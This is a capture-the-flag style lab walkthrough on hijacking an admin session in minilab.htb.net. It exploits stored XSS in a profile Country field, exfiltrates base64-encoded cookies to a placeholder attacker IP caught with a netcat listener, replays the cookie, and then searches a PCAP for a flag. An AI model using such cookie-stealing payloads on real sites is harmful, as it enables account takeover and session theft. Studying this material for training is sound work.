# Skill Assessment

#### You are currently participating in a bug bounty program.

* The only URL in scope is `http://minilab.htb.net`
* Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
* Test account credentials:
  * Email: heavycat106
  * Password: rocknrol
* Through dirbusting, you identified the following endpoint `http://minilab.htb.net/submit-solution`

Find a way to hijack an admin's session. Once you do that, answer the two questions below.

#### Read the flag residing in the admin's public profile. Answer format: \[string]

The first thing that we should do to try to hijack a session from the web application is understand what is keeping the user with the session established. After looking around a bit I found that the **Cookie: auth-sess** is the key component.&#x20;

So our first task ask us to read the file from the admin's public profile. This mislead me a bit, but fortunately the hint actually tell that we have to make the admin's profile public in order to read the flag.

Before moving to the solution let's first ask these two questions:

* What is the admin's profile?
* How do I hijack his session?

We don't have any information regarding this questions. However, the statement above give us a clue that we have to explore the `http://minilab.htb.net/submit-solution` endpoint.

If we paste the URL on the browser, we should receive the following output:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

From the output above we can that a url is missing. Let's add it and append the domain to it:

`http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/submit-solution`

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Now the output is different. But what does it mean?&#x20;

This endpoint simulates the admin interaction. Basically this is where we "deliver" the payload to the admin.

Since that we make this clear, now let's explore the application and how we can deliver the payload.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

When we logged in with the provided credentials this is are the default values. The vulnerable parameter that we are going to exploit is the **Country** field.&#x20;

To edit it, simply delete the presented values and replace it with `<script>alert(document.domain)</script>`

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Then click it on **Share**.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

And the payload got executed! Notice the highlighted URL, this is what we have to deliver to the admin.

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

By pressing **Ctrl + Shit + I** we can inspect the Cookie value. We can see that there is indeedn a **auth-session**, and the **HttpOnly** is set to false.

Now we have to came with a payload that retrieves the Cookie from the admin's connection attempt:

{% code overflow="wrap" %}
```
"><img src="x" onerror="document.write(`<img src='http://OUR_VPN_IP:PORT?cookie=${btoa(document.cookie)}'>`)">
```
{% endcode %}

Replace the IP, paste the the payload on the **Country** field and save.

In order to capture the Request, we have to setup a listener on our machine:

```
nc -lvpn 8000
```

Now, on a private tab, or different browser paste the following URL:

{% code overflow="wrap" %}
```
http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

And we got the admin's cookie!

Notice that in our previous payload we used the function btoa that encodes a string to base64.

Now we have to reverse the process:

```
echo "ENCODED COOKIE" | base64 --decode
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>



Paste the decoded Cookie on the Cookie value and refresh the page.

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

And we got Admin access! Now we have to make the admin's profile public. Click on **Change Visibility**.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Then click on **Share**.

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

And we got the first flag!

#### Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}

For the second part of this lab, we have to download the pcap file on the admins profile

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Click on Flag2 do download the pcap file and then open it with wireshark

Then we have to look for a part of the string. Click on **Edit** > **Find Packet** > Select **Packet bytes** and **String**.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Then just click on **Find** and we got the second flag!
